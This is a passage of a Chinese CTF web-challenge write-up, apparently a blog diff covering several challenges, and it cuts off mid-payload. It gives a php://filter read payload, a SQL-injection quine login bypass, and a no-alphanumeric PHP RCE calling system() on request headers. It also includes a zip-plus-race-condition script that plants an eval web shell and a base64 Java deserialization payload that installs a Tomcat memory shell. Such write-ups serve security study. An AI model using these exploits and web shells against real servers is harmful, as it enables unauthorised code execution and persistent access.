&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;1=1&amp;flag=php://filter/convert.base64-encode/resource=flag.php </span><br></pre></td></tr></table></figure>
+
+<h2 id="can-u-login-airrudder"><a href="#can-u-login-airrudder" class="headerlink" title="can_u_login (airrudder)"></a>can_u_login (airrudder)</h2><p>跟第五空间的 yet_another_mysql_injection 这道题一样，用的是 sqli quine，payload 也一样:</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password<span class="operator">=</span><span class="string">&#x27;UNION/**/SELECT/**/REPLACE(REPLACE(&#x27;</span>&quot;UNION/**/SELECT/**/REPLACE(REPLACE(&quot;<span class="number">1</span>&quot;,CHAR(34),CHAR(39)),CHAR(49),&quot;<span class="number">1</span>&quot;)%23&#x27;,CHAR(34),CHAR(39)),CHAR(49),&#x27;&quot;<span class="keyword">UNION</span><span class="comment">/**/</span><span class="keyword">SELECT</span><span class="comment">/**/</span>REPLACE(REPLACE(&quot;1&quot;,<span class="type">CHAR</span>(<span class="number">34</span>),<span class="type">CHAR</span>(<span class="number">39</span>)),<span class="type">CHAR</span>(<span class="number">49</span>),&quot;1&quot;)<span class="operator">%</span><span class="number">23</span><span class="string">&#x27;)%23 </span></span><br></pre></td></tr></table></figure>
+
+<h2 id="简单的php-airrudder"><a href="#简单的php-airrudder" class="headerlink" title="简单的php (airrudder)"></a>简单的php (airrudder)</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$code</span>) &gt; <span class="number">80</span> <span class="keyword">or</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[A-Za-z0-9]|\&#x27;|&quot;|`|\ |,|\.|-|\+|=|\/|\\|&lt;|&gt;|\$|\?|\^|&amp;|\|/is&#x27;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27; Hello&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span> === <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\s\(\)]+?\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$code</span>))&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>很明显的无参RCE，然后还不能有数字字母，所以这里可以用取反绕过：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// phpinfo 的值</span><br><span class="line">?code=[~%8f%97%8f%96%91%99%90][!%FF](); </span><br></pre></td></tr></table></figure>
+
+<p>同样的手段，构造出 <code>system(current(getallheaders()));</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=[~%8c%86%8c%8b%9a%92][!%FF]([~%9c%8a%8d%8d%9a%91%8b][!%FF]([~%98%9a%8b%9e%93%93%97%9a%9e%9b%9a%8d%8c][!%FF]())); </span><br></pre></td></tr></table></figure>
+
+<p><img src="https://img-blog.csdnimg.cn/bd522c23b9b44f908e5c550c234f4383.png" alt="在这里插入图片描述"></p>
+<h2 id="压缩包-yu22x"><a href="#压缩包-yu22x" class="headerlink" title="压缩包 (yu22x)"></a>压缩包 (yu22x)</h2><p>题目关键的地方如下<br><img src="https://img-blog.csdnimg.cn/a19400f4d43c4b339cd066a8e558b721.png" alt="在这里插入图片描述"></p>
+<p>将我们上传的内容写到&#x2F;tmp下，接着作为压缩包解压，然后经过一堆过滤后如果不满足则删除文件。<br>这样就会存在条件竞争的可能，并且解压后生成的文件路径可以通过计算获得。<br>1、将如下php内容压缩生成zip文件。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;11111&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/x.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>2、条件竞争脚本如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#author:yu22x</span></span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">url=<span class="string">&quot;http://192.168.1.110:8521/&quot;</span></span><br><span class="line">sess=requests.session()</span><br><span class="line">s = <span class="built_in">open</span>(<span class="string">&#x27;a.zip&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">content=base64.b64encode(s)</span><br><span class="line">data=&#123;<span class="string">&#x27;content&#x27;</span>:content&#125;</span><br><span class="line">i = hashlib.md5(content)</span><br><span class="line">md=hashlib.md5((<span class="string">&#x27;/tmp/&#x27;</span>+<span class="built_in">str</span>(i.digest().<span class="built_in">hex</span>())).encode())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.post( url,data=data )</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read</span>(<span class="params">session</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        resp = session.get(url+<span class="string">f&#x27;static/upload/<span class="subst">&#123;md&#125;</span>/a.php&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;yes&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    event=threading.Event()</span><br><span class="line">    <span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">            threading.Thread(target=write,args=(session,)).start()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">            threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">    event.<span class="built_in">set</span>() </span><br></pre></td></tr></table></figure>
+
+<p>通过蚁剑连接x.php密码为1<br>根目录下拿到flag</p>
+<h2 id="easy-sql-yu22x"><a href="#easy-sql-yu22x" class="headerlink" title="easy_sql (yu22x)"></a>easy_sql (yu22x)</h2><p>扫描后台发现phpmyadmin<br><img src="https://img-blog.csdnimg.cn/4a4e025dc69c494fbc0b32bf4428ee53.png" alt="在这里插入图片描述"></p>
+<p>登录需要密码，盲猜用户名root<br>试了几个弱口令。<br>发现密码为password时登录成功，估计是非预期了。<br><img src="https://img-blog.csdnimg.cn/cc2a0aced10e44ba84e124d1cde7a6e1.png" alt="在这里插入图片描述"></p>
+<p>用户名挨个试了一遍，发现使用用户名为SuperF1@g登录时直接出flag了。<br><img src="https://img-blog.csdnimg.cn/675d808f9a7940c09dac99e0b3aca097.png" alt="在这里插入图片描述"></p>
+<h2 id="Ez-Java-xenny"><a href="#Ez-Java-xenny" class="headerlink" title="Ez_Java(xenny)"></a>Ez_Java(xenny)</h2><p>ysoserial不出网<code>http://novic4.cn/index.php/archives/26.html#cl-4</code></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.JMXServiceURL;</span><br><span class="line"><span class="keyword">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">lab4exp</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">        Map map=<span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String,Integer&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="string">&quot;rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZZTaMLT7P4KxAwACSQAEc2l6ZUwACmNvbXBhcmF0b3J0ABZMamF2YS91dGlsL0NvbXBhcmF0b3I7eHAAAAACc3IAQm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuVHJhbnNmb3JtaW5nQ29tcGFyYXRvci/5hPArsQjMAgACTAAJZGVjb3JhdGVkcQB+AAFMAAt0cmFuc2Zvcm1lcnQALUxvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwc3IAQG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuY29tcGFyYXRvcnMuQ29tcGFyYWJsZUNvbXBhcmF0b3L79JkluG6xNwIAAHhwc3IAO29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuQ2hhaW5lZFRyYW5zZm9ybWVyMMeX7Ch6lwQCAAFbAA1pVHJhbnNmb3JtZXJzdAAuW0xvcmcvYXBhY2hlL2NvbW1vbnMvY29sbGVjdGlvbnM0L1RyYW5zZm9ybWVyO3hwdXIALltMb3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zNC5UcmFuc2Zvcm1lcjs5gTr7CNo/pQIAAHhwAAAAAnNyADxvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnM0LmZ1bmN0b3JzLkNvbnN0YW50VHJhbnNmb3JtZXJYdpARQQKxlAIAAUwACWlDb25zdGFudHQAEkxqYXZhL2xhbmcvT2JqZWN0O3hwdnIAN2NvbS5zdW4ub3JnLmFwYWNoZS54YWxhbi5pbnRlcm5hbC54c2x0Yy50cmF4LlRyQVhGaWx0ZXIAAAAAAAAAAAAAAHhwc3IAP29yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9uczQuZnVuY3RvcnMuSW5zdGFudGlhdGVUcmFuc2Zvcm1lcjSL9H+khtA7AgACWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7WwALaVBhcmFtVHlwZXN0ABJbTGphdmEvbGFuZy9DbGFzczt4cHVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAFzcgA6Y29tLnN1bi5vcmcuYXBhY2hlLnhhbGFuLmludGVybmFsLnhzbHRjLnRyYXguVGVtcGxhdGVzSW1wbAlXT8FurKszAwAGSQANX2luZGVudE51bWJlckkADl90cmFuc2xldEluZGV4WwAKX2J5dGVjb2Rlc3QAA1tbQlsABl9jbGFzc3EAfgAUTAAFX25hbWV0ABJMamF2YS9sYW5nL1N0cmluZztMABFfb3V0cHV0UHJvcGVydGllc3QAFkxqYXZhL3V0aWwvUHJvcGVydGllczt4cAAAAAD/dXIAA1tbQkv9GRVnZ9s3AgAAeHAAAAACdXIAAltCrPMX+AYIVOACAAB4cAAANpHK/rq+AAAAMgKlCgC5AV8IAWAJAKIBYQgAvQkAogFiBwFjCgAGAV8KAAYBZAoABgFlCgCiAWYJAKIBZwgBaAoBaQFqCgAhAWsKACEBbAoBaQFtBwFuCgFpAW8KABEBcAoAEQFxCgAhAXIHAXMIAXQKAB4BdQgBdgoAHgF3CgF4AXkKACABeggBewcBfAcA2AcBfQcBfggBfwoAHgGACAGBCAGCCAGDCAGECAGFBwGGBwGHCAGICwApAYkIAYoKACEBiwcBjAcBjQgA8QcBjgcBjwgA8wgBkAgA9woAIQGRCAGSCgGTAZQKACEBlQgBlgoAIQGXCAGYCAGZCAGaBwGbCgGcAZ0KAZwBngoBnwGgCgBAAaEIAaIKAEABowoAQAGkCgAyAaUKAaYBpwgBqAsAKQGpCAGqCgAhAasHAawKAE4BXwoALwGtCAElCgBOAa4IAScIAQ4LACkBrwoBsAGxCAGyCgAeAbMKAbQBtQoBtAG2BwG3CAEEBwG4CgBdAbkIAQgHAboKAGABuwsBvAG9CwG+Ab8LAb4BwAcBwQsAZQHCCAHDCAHECgAhAcULAGUBxgcBxwoAawHICAHJCgBrAcoIAcsIAcwLAc0BzggBzwoB0AHRBwHSCgB0AdMKAdAB1AgB1QgB1gkB1wHYCgAeAdkKAXgBtQcB2goAfAFfCgB8AdsKAdAB3AoB3QHeCgHdAd8KAdcB4AoAIAGrCAHhCwApAeIKAKIB4woAogHkCQCiAeUHAeYHAecKAIkB6AcB6QcB6goAjQFfCwAqAaUKACEB6woBpgHsCgAgAWUKAI0B7QoAogHuCgAhAe8LAfAB8QgB8goBkwHzCgAGAfQIAfUHAfYKAJsB9wsB+AH5BwH6CgAeAfsIAU8HAfwHAqMKAKIBXwcB/goApAFfCgCkAf8KAKQCAAoAHgIBCgCkAgIKAJ4CAwcCBAoAqwFfCgCrAgUKAKsCAAkCBgIHCgIGAggKAKsCCQoAngIKBwILBwIMCgAeAg0KAg4BtQoCDgIPCwChAa4HAhAHAhEBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhc3MBAANtZDUBAAdwYXlsb2FkAQARTGphdmEvbGFuZy9DbGFzczsBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEAPUx5c29zZXJpYWwvcGF5bG9hZHMvdGVtcGxhdGVzL1RvbWNhdEZpbHRlck1lbVNoZWxsRnJvbVRocmVhZDsBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAAW0BAB1MamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0OwEAAXMBAANyZXQBAA1TdGFja01hcFRhYmxlBwF+BwFzAQAMYmFzZTY0RW5jb2RlAQAWKFtCKUxqYXZhL2xhbmcvU3RyaW5nOwEAB0VuY29kZXIBABJMamF2YS9sYW5nL09iamVjdDsBAAZiYXNlNjQBAAFlAQAVTGphdmEvbGFuZy9FeGNlcHRpb247AQACYnMBAAJbQgEABXZhbHVlAQAKRXhjZXB0aW9ucwEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQAJdHJhbnNmb3JtAQByKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO1tMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOylWAQAIZG9jdW1lbnQBAC1MY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTsBAAhoYW5kbGVycwEAQltMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9zZXJpYWxpemVyL1NlcmlhbGl6YXRpb25IYW5kbGVyOwcCEgEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29tL3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7BwITAQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQAKZ2V0UmVxdWVzdAEAGkxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQALZ2V0UmVzcG9uc2UBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEAA2NtZAEABG5leHQBAAVFbnRyeQEADElubmVyQ2xhc3NlcwEAFUxqYXZhL3V0aWwvTWFwJEVudHJ5OwEACHBhcmFtS2V5AQAOcGFyYW1WYWx1ZUxpc3QBABVMamF2YS91dGlsL0FycmF5TGlzdDsBAAVmaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAtyZWFsUmVxdWVzdAEAJ0xvcmcvYXBhY2hlL2NhdGFsaW5hL2Nvbm5lY3Rvci9SZXF1ZXN0OwEAEmNveW90ZVJlcXVlc3RGaWVsZAEADWNveW90ZVJlcXVlc3QBABtMb3JnL2FwYWNoZS9jb3lvdGUvUmVxdWVzdDsBAApwYXJhbWV0ZXJzAQAoTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvaHR0cC9QYXJhbWV0ZXJzOwEAD3BhcmFtSGFzaFZhbHVlcwEACHBhcmFtTWFwAQAZTGphdmEvdXRpbC9MaW5rZWRIYXNoTWFwOwEAFExqYXZhL3V0aWwvSXRlcmF0b3I7AQALcGFnZUNvbnRleHQBABNMamF2YS91dGlsL0hhc2hNYXA7AQAHc2Vzc2lvbgEAIExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlc3Npb247AQABawEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAZtZXRob2QBAA5ldmlsY2xhc3NfYnl0ZQEACWV2aWxjbGFzcwEADnVybENsYXNzTG9hZGVyAQAZTGphdmEvbmV0L1VSTENsYXNzTG9hZGVyOwEACWRlZk1ldGhvZAEABmFyck91dAEAH0xqYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbTsBAAFmAQAEZGF0YQEAC2xhc3RSZXF1ZXN0AQAMbGFzdFJlc3BvbnNlAQAOc2VydmxldFJlcXVlc3QBAB5MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDsBAA9zZXJ2bGV0UmVzcG9uc2UBAB9MamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7AQALZmlsdGVyQ2hhaW4BABtMamF2YXgvc2VydmxldC9GaWx0ZXJDaGFpbjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQAWTG9jYWxWYXJpYWJsZVR5cGVUYWJsZQEAUkxqYXZhL3V0aWwvTWFwJEVudHJ5PExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL3V0aWwvQXJyYXlMaXN0PExqYXZhL2xhbmcvU3RyaW5nOz47PjsBAClMamF2YS91dGlsL0FycmF5TGlzdDxMamF2YS9sYW5nL1N0cmluZzs+OwEAaExqYXZhL3V0aWwvSXRlcmF0b3I8TGphdmEvdXRpbC9NYXAkRW50cnk8TGphdmEvbGFuZy9TdHJpbmc7TGphdmEvdXRpbC9BcnJheUxpc3Q8TGphdmEvbGFuZy9TdHJpbmc7Pjs+Oz47BwKjBwIUBwIVBwIWBwGGBwGHBwF9BwIXBwD1BwGsBwIYBwIZBwG3BwG4BwIaBwG6BwIbBwHBBwHHBwIcAQABeAEAByhbQlopW0IBAAFaBwIdAQAHZGVzdHJveQEACDxjbGluaXQ+AQAEbmFtZQEAClVSTFBhdHRlcm4BABV3ZWJhcHBDbGFzc0xvYWRlckJhc2UBADJMb3JnL2FwYWNoZS9jYXRhbGluYS9sb2FkZXIvV2ViYXBwQ2xhc3NMb2FkZXJCYXNlOwEAD3N0YW5kYXJkQ29udGV4dAEAKkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3RhbmRhcmRDb250ZXh0OwEABmFDbGFzcwEAB0NvbmZpZ3MBAA1maWx0ZXJDb25maWdzAQAPTGphdmEvdXRpbC9NYXA7AQAOYmVoaW5kZXJGaWx0ZXIBAAlmaWx0ZXJEZWYBADFMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJEZWY7AQAJZmlsdGVyTWFwAQAxTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyTWFwOwEAC2NvbnN0cnVjdG9yAQAfTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yOwEAMkxvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25GaWx0ZXJDb25maWc7AQA+TGphdmEvbGFuZy9DbGFzczwrTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQ7PjsHAfYHAfoHAXwBAApTb3VyY2VGaWxlAQAjVG9tY2F0RmlsdGVyTWVtU2hlbGxGcm9tVGhyZWFkLmphdmEMAMEAwgEAEDNjNmUwYjhhOWMxNTIyNGEMALsAvAwAvQC8AQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMAh4CHwwCIAIhDAC+AMgMAL4AvAEAA01ENQcCIgwCIwIkDAIlAiYMAicCKAwCKQIqAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAisCJgwAwQIsDAIgAi0MAi4CIQEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhLnV0aWwuQmFzZTY0DAIvAjABAApnZXRFbmNvZGVyDAIxAjIHAhcMAjMCNAwCNQI2AQAOZW5jb2RlVG9TdHJpbmcBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N0cmluZwEAFnN1bi5taXNjLkJBU0U2NEVuY29kZXIMAjcCOAEABmVuY29kZQEACmdldERlY29kZXIBAAZkZWNvZGUBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyAQAMZGVjb2RlQnVmZmVyAQAlamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdAEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAHUmVmZXJlcgwCOQDIAQAXaHR0cHM6Ly93d3cuZ29vZ2xlLmNvbS8MAjoCOwEAK29yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1JlcXVlc3RGYWNhZGUBACNqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0V3JhcHBlcgEALG9yZy9hcGFjaGUvY2F0YWxpbmEvY29ubmVjdG9yL1Jlc3BvbnNlRmFjYWRlAQAkamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2VXcmFwcGVyAQANeC1jbGllbnQtZGF0YQwCPAI9AQAHb3MubmFtZQcCPgwCPwDIDAJAAiEBAAN3aW4MAkECQgEAAi9jAQAJL2Jpbi9iYXNoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgcCQwwCRAJFDAJGAkcHAkgMAkkCSgwAwQJLAQACXEEMAkwCTQwA+AIhDAJOAk8HAlAMAlECUgEACHJlYmV5b25kDAIxAiEBAARQT1NUDAJTAlQBABFqYXZhL3V0aWwvSGFzaE1hcAwCVQJWDAJXAlgMAlkCWgcCWwwCXAIhAQAADAJdAl4HAhkMAl8CYAwCYQJiAQAlb3JnL2FwYWNoZS9jYXRhbGluYS9jb25uZWN0b3IvUmVxdWVzdAEAGW9yZy9hcGFjaGUvY295b3RlL1JlcXVlc3QMAmMCZAEAF2phdmEvdXRpbC9MaW5rZWRIYXNoTWFwDAJlAmYHAmcMAOYCaAcCGwwCaQI9DAD4AjgBABNqYXZhL3V0aWwvTWFwJEVudHJ5DAJqAjgBAAEgAQABKwwCawJsDAJtAjgBABNqYXZhL3V0aWwvQXJyYXlMaXN0DAJuAigBAAE9DAJhAm8BABBlNDVlMzI5ZmViNWQ5MjViAQABdQcCGAwCcAJxAQADQUVTBwIdDAIjAnIBAB9qYXZheC9jcnlwdG8vc3BlYy9TZWNyZXRLZXlTcGVjDADBAnMMAOoCdAEAFWphdmEubGFuZy5DbGFzc0xvYWRlcgEAC2RlZmluZUNsYXNzBwJ1DAJ2AMAMAncCMgEAFnN1bi9taXNjL0JBU0U2NERlY29kZXIMAYUA3AwCeAJ5BwJ6DAJ7AnwMAn0CfgwCfwKAAQAIZ29kemlsbGEMAoEAyAwA2wDcDAFBAUIMAL8AwAEAF2phdmEvbmV0L1VSTENsYXNzTG9hZGVyAQAMamF2YS9uZXQvVVJMDADBAoIBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAB1qYXZhL2lvL0J5dGVBcnJheU91dHB1dFN0cmVhbQwCgwKEDAKFAlIMAoYCJgwA0ADRDAKDAi0HAhYMAO8ChwEAD015RmlsdGVyVmVyc2lvbgwCiAKJDAIeAooBAAIvKgEAMG9yZy9hcGFjaGUvY2F0YWxpbmEvbG9hZGVyL1dlYmFwcENsYXNzTG9hZGVyQmFzZQwCiwKMBwKNDAKOAo8BAChvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvU3Rhb